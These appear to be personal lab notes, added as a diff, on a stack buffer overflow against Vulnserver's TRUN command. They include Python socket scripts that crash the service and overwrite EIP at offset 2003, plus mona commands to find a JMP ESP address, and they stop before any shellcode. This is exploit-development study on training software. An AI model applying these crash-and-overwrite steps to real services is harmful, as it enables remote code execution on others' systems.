@@ -1,0 +1,90 @@
+https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
+step by step 
+
+static anal
+----------------
+strings 
+9999
+
+
+ file secureserverind.exe
+secureserverind.exe: PE32 executable (console) Intel 80386, for MS Windows
+
+dyna anal 
+_________________
+run the software
+
+
+
+windows powershell 
+netstat -antot 
+
+socket script 
+on linux 
+
+===============================================================================================
+#!/usr/bin/env python
+import socket
+
+buf = "TRUN /.:/" ##command to be sent
+
+buff += "A" * 5000 ##Data that should crash 
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP 
+
+s.connect(("192.168.65.10",9999)) ## Define the host and port 
+
+print s.recv(1024) ## print to screen the responce 
+
+s.send(buf) ## send the var buf 
+
+print s.recv(1024) ## print to the screen the responce 
+
+s.close() ##close the socket 
+
+==================================================================================================
+
+verify we can crash it ^^^^
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+5000 
+
+paste field into script 
+
+run it 
+
+once you get the eip ie 386F4337
+
+paste it into the https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+gives you the offset length after you click away 
+
+now do a * 2003 or what ever number it returns 
+
+add the quad bs to make sure you are hitting the eip 
+=================================================================================================
+#!/usr/bin/env python
+import socket
+buf = "TRUN /.:/" ##command to be sent
+buf += "A" * 2003
+buf += "BBBB"
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP 
+s.connect(("192.168.65.10",9999)) ## Define the host and port 
+print s.recv(1024) ## print to screen the responce 
+s.send(buf) ## send the var buf 
+print s.recv(1024) ## print to the screen the responce 
+s.close() ##close the socket
+===============================================
+
+in the debugger window 
+!mona modules
+
+identify the module with ASLR set to false 
+
+!mona jmp -r esp -m "essfunc.dll"
+
+winow log data 
+
+
+625012A0
